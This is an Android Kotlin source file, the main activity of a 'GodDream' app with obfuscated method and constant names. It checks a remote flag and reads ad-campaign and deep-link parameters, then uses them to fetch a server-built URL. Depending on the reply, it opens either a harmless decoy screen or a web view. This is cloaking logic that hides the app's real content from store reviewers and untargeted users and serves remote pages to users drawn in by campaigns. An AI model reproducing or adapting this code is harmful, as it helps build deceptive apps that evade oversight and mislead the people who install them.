package com.carxtech.goddreamblack

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.carxtech.databinding.ActivityMainBinding
import com.carxtech.goddreamblack.AppClassGodDream.Companion.SJSJDQWD
import com.carxtech.goddreamblack.AppClassGodDream.Companion.AASQSQSQSQ
import com.carxtech.goddreamblack.AppClassGodDream.Companion.SPDPWPDOWOD
import com.carxtech.goddreamblack.AppClassGodDream.Companion.isisdiwowodow
import com.carxtech.goddreamblack.AppClassGodDream.Companion.xcxcsccqdwqd
import com.carxtech.goddreamblack.AppClassGodDream.Companion.ahhahhdwjdjw
import com.carxtech.goddreamblack.AppClassGodDream.Companion.bxgxgcgqwwd
import com.carxtech.goddreamblack.AppClassGodDream.Companion.sgsggdgwd
import com.carxtech.goddreamwhite.MainGodsDream
import com.facebook.applinks.AppLinkData
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private lateinit var bindMain: ActivityMainBinding

    var checker: Boolean = false
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMain.root)
        jsoup = ""
        poqodqowdoqw(this)
        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefs.getBoolean("activity_exec", false)) {
            GlobalScope.launch {
                aoaosqpspqs()
            }
            finish()
        } else {
            val exec = prefs.edit()
            exec.putBoolean("activity_exec", true)
            exec.apply()
            val job = GlobalScope.launch(Dispatchers.IO) {
                checker = getCheckCode(isisdiwowodow+xcxcsccqdwqd)
                Log.d("CHECKAPPS", "I did something")
            }
            runBlocking {
                try {
                    job.join()
                } catch (_: Exception){
                }
            }

            if (checker){
                AppsFlyerLib.getInstance()
                    .init(SJSJDQWD, conversionDataListener, applicationContext)
                AppsFlyerLib.getInstance().start(this)
                afNullRecordedOrNotChecker(1500)

            } else {
                GlobalScope.launch(Dispatchers.IO) {
                    aoaosqpspqs()
                }
            }
        }





    }



    private suspend fun getCheckCode(link: String): Boolean {
        val url = URL(link)
        val urlConnection = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text == "1") {
                Log.d("jsoup status", text)
                true
            } else {
                Log.d("jsoup status", "is null")
                false
            }
        } finally {
            urlConnection.disconnect()
        }

    }

    private fun afNullRecordedOrNotChecker(timeInterval: Long): Job {

        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1: String? = sharPref.getString(AASQSQSQSQ, null)
                if (hawk1 != null) {
                    Log.d("TestInUIHawk", hawk1.toString())
                    aoaosqpspqs()
                    break
                } else {
                    val hawk1: String? = sharPref.getString(AASQSQSQSQ, null)
                    Log.d("TestInUIHawkNulled", hawk1.toString())
                    delay(timeInterval)
                }
            }
        }
    }



    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editor = sharPref.edit()

            val dataGotten = data?.get("campaign").toString()
            editor.putString(AASQSQSQSQ, dataGotten)
            editor.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    fun poqodqowdoqw(context: Context) {
        val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editor = sharPref.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host

                editor.putString(SPDPWPDOWOD, params.toString())
                editor.apply()
            }
            if (appLinkData == null) {

            }
        }
    }


    private fun addsaddwdqwdq(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                jsoup = text
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
    private suspend fun pspdpwdowodow(): String {
        val sharedPref = getSharedPreferences("SP", MODE_PRIVATE)

        val nameParameter: String? = sharedPref.getString(AASQSQSQSQ, null)
        val appLinkParameter: String? = sharedPref.getString(SPDPWPDOWOD, null)


        val taskName = "$ahhahhdwjdjw$bxgxgcgqwwd$sgsggdgwd$nameParameter"
        val taskLink = "$ahhahhdwjdjw$bxgxgcgqwwd$sgsggdgwd$appLinkParameter"

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (nameParameter != "null") {
                addsaddwdqwdq(taskName)
                Log.d("Check1C", taskName)
            } else {
                addsaddwdqwdq(taskLink)
                Log.d("Check1C", taskLink)
            }
        }
        return jsoup
    }

    private suspend fun aoaosqpspqs(){
        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = pspdpwdowodow()
            Log.d("jsoup status from global scope", jsoup)
        }

        job.join()
        Log.d("jsoup status out of global scope", jsoup)

        if (jsoup == AppClassGodDream.jsuwuwdw) {
            Intent(applicationContext, MainGodsDream::class.java).also { startActivity(it) }
        } else {
            Intent(applicationContext,GodDreamWeb::class.java).also { startActivity(it) }
        }
        finish()
    }
}